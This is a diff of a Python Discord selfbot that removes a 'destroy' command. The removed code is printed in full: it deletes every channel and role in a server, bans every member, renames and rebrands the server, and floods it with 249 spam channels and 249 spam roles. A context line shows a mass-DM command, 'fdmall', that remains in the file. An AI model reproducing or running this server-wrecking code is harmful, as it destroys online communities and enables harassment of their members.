@@ -270,40 +270,6 @@ async def _group_leaver(ctx):
         if isinstance(channel, discord.GroupChannel):
             await channel.leave()
 
-@bot.command()
-async def destroy(ctx):
-    await ctx.message.delete()
-    print("[{:%H:%M:%S}]".format(datetime.datetime.now()),f"| [LOG] Destroy command executed")
-    for channel in list(ctx.guild.channels):
-        try:
-            await channel.delete()    
-        except:
-            pass
-    for user in list(ctx.guild.members):
-        try:
-            await user.ban()
-        except:
-            pass    
-    for role in list(ctx.guild.roles):
-        try:
-            await role.delete()
-        except:
-            pass
-    try:
-        await ctx.guild.edit(
-            name=RandString(),
-            description="https://bot.wtf",
-            reason="https://bot-selfbot.github.io",
-            icon=None,
-            banner=None
-        )  
-    except:
-        pass        
-    for _i in range(249):
-        await ctx.guild.create_text_channel(name="Beamed By Element")
-    for _i in range(249):
-        await ctx.guild.create_role(name="Beamed By Element")
-    print(f"{LIGHT_RED}Complete")
 
 @bot.command()
 async def fdmall(ctx):
